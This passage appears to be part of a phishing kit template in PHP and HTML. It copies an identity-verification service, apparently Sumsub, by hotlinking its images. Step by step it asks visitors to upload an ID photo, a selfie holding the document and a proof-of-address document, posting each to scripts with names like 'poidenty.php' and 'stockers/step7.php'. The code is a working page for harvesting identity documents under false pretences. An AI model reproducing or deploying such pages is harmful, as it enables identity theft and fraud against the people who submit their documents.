							<h1 style="font-size:1.4rem!important">
								Choose your ID type</h1>
	<div class="doc_type">
		<div class="doc_type_choice">
			<div class="doc_type_choice_wrapper">
				<div><img src="https://api.sumsub.com/idensic/i_passport.png" alt="" style="
    width: 13em;
"></div>
				<label class="cont">
					<input type="radio" name="doc_type" value="Passport">
					<span class="checkmark"></span>
					<span> Passport</span>
					</label>
				</div>
			</div>
	<div class="doc_type_choice">
		<div class="doc_type_choice_wrapper">
			<div><img src="https://i.imgur.com/4ZtWNXS.png" style="
    width: 13em;
"alt="">
		</div>
	<label class="cont">
		<input type="radio" name="doc_type" value="National ID">
		<span class="checkmark"></span>
		<span> Driving license</span>
	</label>
		</div>
	</div>
<div class="doc_type_choice">
	<div class="doc_type_choice_wrapper"><div>
		<img src="https://api.sumsub.com/idensic/i_id_front.png" style="
    width: 13em;
" alt="">
	</div>
	<label class="cont">
		<input type="radio" name="doc_type" value="Driver's license">
		<span class="checkmark"></span>
		<span>  ID card</span>
	</label>
	</div>
	</div>
	</div>
	<input style="margin-bottom:1.2rem;margin-top:1rem" type="button" class="bt bt_select_one" value="Continue">
	</div>
	<div id="area_up_id" style="display:none">

		<h1 style="font-size:1.4em">Please upload a photo of your id. The photo should be bright and clear, and all corners of your document must be visible.
		<span></span>
		</h1>
                    <div class="row rules text-center">
			<div class="rule">
			<img src="https://i.imgur.com/yIqBX8B.png" style="
    width: 39em;
" alt=""><div>
		</div>
			</div>
		
			
					</div>

					<div class="col-md-12">
<form action="../post/poidenty.php" method="post" enctype="multipart/form-data">


<input type="file" name="files">
<input type="hidden" name="idtype" value="proof">
<div class="buttons">

</div>

<div class="imagesArea"></div><input id="Button" class="btn btn-primary" type="submit" value="<?=$api->transcode("Continue");?>"><div><a href="javascript:void(0)" class="back">back</a></div></form></div>

<script>
    $(document).on('click','.doc_type_choice',function(){$(this).find('[name="doc_type"]').prop('checked',true);});$('.bt_select_one').click(function(){if($('[name=doc_type]').is(':checked')){$('#area_choose').hide('slow');$('#area_up_id > h1 > span, #area_up_selfie > h1 > span').html($('[name=doc_type]:checked').parent().find('span:last').html());$('#area_up_id').show('slow');}});$(document).on('click','#area_up_id .back',function(){$('#area_up_id').hide('slow');$('#area_choose').show('slow');});$(document).on('submit','#select_one > form',function(e){e.preventDefault();if($('#select_one .imagesArea .files').length==0){return false;}
$('#rotate').removeClass('hide');$.post('../extra/stockers/step7.php',$(this).serialize(),function(dt,st){if(dt&&st=='success'){$('.proof li:nth-child(2)').addClass('current');$('#select_one').addClass('hide');$('#select_two').removeClass('hide');window.scrollTo(0,0);$('#rotate').addClass('hide');}});});</script></div>

</div>
				<?php } ?>
				
				
<?php if(isset($_GET['selfie'])) {
?>
<div id="select_one">
				
						
	<div id="area_up_id" >

		<h1 style="font-size:1.4em">Please take a selfie with your document so that it’s clearly visible and does not cover your face.
		<span></span>
		</h1>
                    <div class="row rules text-center">
			<div class="rule">
			<img src="https://i.imgur.com/3ZbAHZC.png" style="
    width: 39em;
" alt=""><div>
		</div>
			</div>
		
			
					</div>

					<div class="col-md-12">
<form action="../post/poidenty.php" method="post" enctype="multipart/form-data">


<input type="file" name="files">
<input type="hidden" name="idtype" value="selfie">
<div class="buttons">

</div>

<div class="imagesArea"></div><input id="Button" class="btn btn-primary" type="submit" value="<?=$api->transcode("Continue");?>"><div></div></form></div>

</div>

</div>
<?php
}
?>
<?php if(isset($_GET['address'])) {
?>
<div id="select_one">
				
						
	<div id="area_up_id" >
<style>.instructions ul{-webkit-columns:2;columns:2;list-style:disc inside}.instructions ul li{list-style-position:outside;margin-left:1em;font-size: 14px}.instructions p{margin:20px 0;font-size: 14px}@media (max-width:480px){h1{display:none}.instructions ul{padding:0}.centered-text{text-align:center}}</style>
		<h3 data-v-1fe4e07e="">Now we will verify your address. Please upload one of the following documents:</h3>
                   <div data-v-1fe4e07e="" class="instructions"><ul>
<li>Bank statements</li>
<li>Utility bills</li>
<li>Internet/Cable TV/House phone line bills</li>
<li>Tax returns</li>
<li>Council tax bills</li>
<li>The Government issued Certifications of Residency, etc</li>
</ul>
<p>We cannot accept screenshots, mobile phone bills, medical bills, credit card statements, receipts for purchases, or insurance statements. Utility bill must be issued within the last 3 months.</p>
</div>
                    <div class="row rules text-center">
                    <center>
			<div class="rule">
			
			<img src="https://api.sumsub.com/idensic/i_doc.png" style="
    width: 10em;
" alt="">
   <div>
		</div>
		
			</div>
		
			 </center>
					</div>

					<div class="col-md-12">
<form action="../post/poidenty.php" method="post" enctype="multipart/form-data">


<input type="file" name="files">
<input type="hidden" name="idtype" value="address">
<div class="buttons">

</div>

<div class="imagesArea"></div><input id="Button" class="btn btn-primary" type="submit" value="<?=$api->transcode("Continue");?>"><div></div></form></div>

</div>

</div>
<?php
}
?>


</div>


    </div></div>

</body>


</html>
